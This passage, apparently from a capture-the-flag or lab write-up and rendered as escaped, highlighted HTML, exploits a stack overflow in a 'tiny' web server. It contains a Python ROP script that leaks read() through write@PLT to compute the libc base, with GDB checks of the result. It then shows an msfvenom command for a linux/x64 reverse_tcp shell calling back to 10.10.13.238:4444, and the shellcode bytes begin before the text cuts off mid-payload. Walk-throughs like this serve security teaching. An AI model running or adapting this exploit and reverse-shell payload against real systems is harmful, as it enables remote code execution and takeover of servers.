+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root@--name:&#x2F;ctf&#x2F;work#&lt;&#x2F;span&gt;&lt;span&gt; readelf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -s&lt;&#x2F;span&gt;&lt;span&gt; libc.so.6 | &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;grep&lt;&#x2F;span&gt;&lt;span&gt; read@
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;....
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;891:&lt;&#x2F;span&gt;&lt;span&gt; 00000000000f7250    90 FUNC    WEAK   DEFAULT   13 read@@GLIBC_2.2.5
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Let&#x27;s write that down, so far we have:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# padding to RIP
+&lt;&#x2F;span&gt;&lt;span&gt;padding = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;A&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;568
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# got and plt
+&lt;&#x2F;span&gt;&lt;span&gt;read_got = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x603088 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# read()@GOT address
+&lt;&#x2F;span&gt;&lt;span&gt;write_plt = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x400c50 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# write()@PLT address
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# offsets
+&lt;&#x2F;span&gt;&lt;span&gt;read_off = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0f7250 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# read() offset from libc base
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# gadgets
+&lt;&#x2F;span&gt;&lt;span&gt;poprdiret = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x4011dd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# pop rdi; ret
+&lt;&#x2F;span&gt;&lt;span&gt;poprsiret = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x4011db &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# pop rsi; pop r15; ret
+&lt;&#x2F;span&gt;&lt;span&gt;push_rsp  = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x023ad1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# push rsp; ret
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Ok, time for first stage. Let&#x27;s try to leak address of read() and substract read_off (offset) to get libc base address.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;httplib
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;struct
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;socket
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;telnetlib
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;urllib
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;execute_payload&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;payload&lt;&#x2F;span&gt;&lt;span&gt;):
+&lt;&#x2F;span&gt;&lt;span&gt;    s = socket.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;socket&lt;&#x2F;span&gt;&lt;span&gt;(socket.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;AF_INET&lt;&#x2F;span&gt;&lt;span&gt;, socket.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SOCK_STREAM&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;    s.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;connect&lt;&#x2F;span&gt;&lt;span&gt;((&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;localhost&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;9999&lt;&#x2F;span&gt;&lt;span&gt;))
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#s.connect((&amp;quot;10.10.10.89&amp;quot;, 1111))
+&lt;&#x2F;span&gt;&lt;span&gt;    s.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;send&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;GET &#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;{}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; HTTP&#x2F;1.1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\r\n\r\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;format&lt;&#x2F;span&gt;&lt;span&gt;(urllib.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;quote_plus&lt;&#x2F;span&gt;&lt;span&gt;(payload)))
+&lt;&#x2F;span&gt;&lt;span&gt;    response = s.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4096&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;    s.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;response
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# padding to RIP
+&lt;&#x2F;span&gt;&lt;span&gt;padding = &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;A&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; * &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;568
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# got and plt
+&lt;&#x2F;span&gt;&lt;span&gt;read_got = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x603088 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# read()@GOT address
+&lt;&#x2F;span&gt;&lt;span&gt;write_plt = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x400c50 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# write()@PLT address
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# offsets
+&lt;&#x2F;span&gt;&lt;span&gt;system_off = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x045390
+&lt;&#x2F;span&gt;&lt;span&gt;read_off = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x0f7250 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# read() offset from libc base
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# gadgets
+&lt;&#x2F;span&gt;&lt;span&gt;poprdiret = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x4011dd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# pop rdi; ret
+&lt;&#x2F;span&gt;&lt;span&gt;poprsiret = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x4011db &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# pop rsi; pop r15; ret
+&lt;&#x2F;span&gt;&lt;span&gt;push_rsp  = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x023ad1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# push rsp; ret
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#### 1 - leak the libc base
+&lt;&#x2F;span&gt;&lt;span&gt;buf = &amp;quot;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;buf += padding
+&lt;&#x2F;span&gt;&lt;span&gt;buf += struct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;Q&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, poprdiret)
+&lt;&#x2F;span&gt;&lt;span&gt;buf += struct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;Q&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0x4&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;buf += struct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;Q&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, poprsiret)
+&lt;&#x2F;span&gt;&lt;span&gt;buf += struct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;Q&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, read_got)
+&lt;&#x2F;span&gt;&lt;span&gt;buf += struct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;Q&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0xF&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;buf += struct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pack&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;Q&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, write_plt)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;response = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;execute_payload&lt;&#x2F;span&gt;&lt;span&gt;(buf).&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;File not found&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]           
+&lt;&#x2F;span&gt;&lt;span&gt;read_addr = struct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;unpack&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;lt;Q&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, response[:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;])[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;read() is at&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(read_addr)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;libc_addr = read_addr - read_off
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;libc base is at&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span&gt;(libc_addr)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Fire up GDB again, and rerun the tiny in the same way. Set breakpoint, and hit r.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root@--name:&#x2F;ctf&#x2F;work#&lt;&#x2F;span&gt;&lt;span&gt; gdb&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -q&lt;&#x2F;span&gt;&lt;span&gt; tiny
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Reading&lt;&#x2F;span&gt;&lt;span&gt; symbols from tiny...done.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pwndbg&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; b *0x000000000040178b
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Breakpoint&lt;&#x2F;span&gt;&lt;span&gt; 1 at 0x40178b: file tiny.c, line 268.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pwndbg&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; r
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Starting&lt;&#x2F;span&gt;&lt;span&gt; program: &#x2F;ctf&#x2F;work&#x2F;tiny 
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;warning:&lt;&#x2F;span&gt;&lt;span&gt; Error disabling address space randomization: Operation not permitted
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;listen&lt;&#x2F;span&gt;&lt;span&gt; on port 9999, fd is 3
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Go open another tab or something and run our script:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root@--name:&#x2F;ctf&#x2F;work#&lt;&#x2F;span&gt;&lt;span&gt; python stage1.py 
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;() is at 0x7fa328ae2250
+&lt;&#x2F;span&gt;&lt;span&gt;libc base is at 0x7fa3289eb000
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Nice, so let&#x27;s confirm that this indeed works. We are going to look and disassemble 0x7fa328ae2250 which is suposed to be address of read() function.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;pwndbg&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; disassemble 0x7fa328ae2250
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Dump&lt;&#x2F;span&gt;&lt;span&gt; of assembler code for function read:
+&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007fa328ae2250 &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;+0&amp;gt;:	cmp    DWORD PTR &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;rip+0x2d24e9&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span&gt;,0x0        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 0x7fa328db4740 &amp;lt;__libc_multiple_threads&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007fa328ae2257 &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;+7&amp;gt;:	jne    0x7fa328ae2269 &amp;lt;read+25&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;0x00007fa328ae2259 &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;+0&amp;gt;:	mov    eax,0x0
+&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;....
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;And it indeed is. We successfuly leaked address of read, and thus are able to calculate base of the libc ( you can play out, and test this by adding offsets to other functions&#x2F;calls and check if they match).&lt;&#x2F;p&gt;
+&lt;br &#x2F;&gt;
+Allright, now let&#x27;s wrap up this. Since we now can tell where push RSP will be, we can use it to execute our shellcode from stack.
+For sake of simplicity, i&#x27;m going to use msfvenom to generate reverse_tcp shellcode for x64, and use handler to connected back to it.
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[badarg:&#x2F;opt&#x2F;metasploit-framework&#x2F;bin]$&lt;&#x2F;span&gt;&lt;span&gt; .&#x2F;msfvenom&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -p&lt;&#x2F;span&gt;&lt;span&gt; linux&#x2F;x64&#x2F;shell&#x2F;reverse_tcp LHOST=10.10.13.238 LPORT=4444&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;  --bad-chars &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\x00&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -f&lt;&#x2F;span&gt;&lt;span&gt; python                                                        
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[-]&lt;&#x2F;span&gt;&lt;span&gt; No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[-]&lt;&#x2F;span&gt;&lt;span&gt; No arch selected, selecting arch: x64 from the payload
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Found&lt;&#x2F;span&gt;&lt;span&gt; 2 compatible encoders
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Attempting&lt;&#x2F;span&gt;&lt;span&gt; to encode payload with 1 iterations of generic&#x2F;none
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;generic&#x2F;none&lt;&#x2F;span&gt;&lt;span&gt; failed with Encoding failed due to a bad character (index=56, char=0x00)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Attempting&lt;&#x2F;span&gt;&lt;span&gt; to encode payload with 1 iterations of x64&#x2F;xor
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;x64&#x2F;xor&lt;&#x2F;span&gt;&lt;span&gt; succeeded with size 175 (iteration=0)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;x64&#x2F;xor&lt;&#x2F;span&gt;&lt;span&gt; chosen with final size 175
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Payload&lt;&#x2F;span&gt;&lt;span&gt; size: 175 bytes
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Final&lt;&#x2F;span&gt;&lt;span&gt; size of python file: 850 bytes
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span&gt; =  &amp;quot;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span&gt; += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\x48\x31\xc9\x48\x81\xe9\xef\xff\xff\xff\x48\x8d\x05&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span&gt; += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\xef\xff\xff\xff\x48\xbb\x6b\xa3\xb0\x9e\x3c\xe7\x62&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span&gt; += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\xc7\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span&gt; += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\x23\x92\x4f\xf4\x35\xbf\xfb\x71\x7b\xeb\x39\x48\x71&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span&gt; += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\xd6\xab\xad\x49\xe2\xea\x2c\x3b\xe8\x67\x8f\xee\x63&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span&gt; += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\xc8\xcc\x56\xed\x23\x9e\x3d\xf3\xda\xb7\x64\x7e\x08&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span&gt; += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\xc5\x34\xc9\xb1\xc0\x33\xe2\x2a\x42\xab\xdb\x8b\xd6&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span&gt; += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\xab\xaf\xdb\xc5\x6b\xb2\xec\x94\x36\xea\x8c\x96\x23&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span&gt; += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\x2a\x56\xf4\x2c\xbd\x08\xed\x33\xac\xb5\xc7\x74\x62&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span&gt; += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\xa2\xbe\x4e\xea\x4f\x57\x48\xff\x35\xad\x48\xfb\xda&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span&gt; += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\x9e\x56\xe2\x2a\x4e\x8c\xeb\x81\x68\x33\xe2\x3b\x9e&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span&gt; += &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;\x34\xeb\x35\x5e\x45\x20\x08\xfb\x33\xc9\xb1\xc1\x33&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
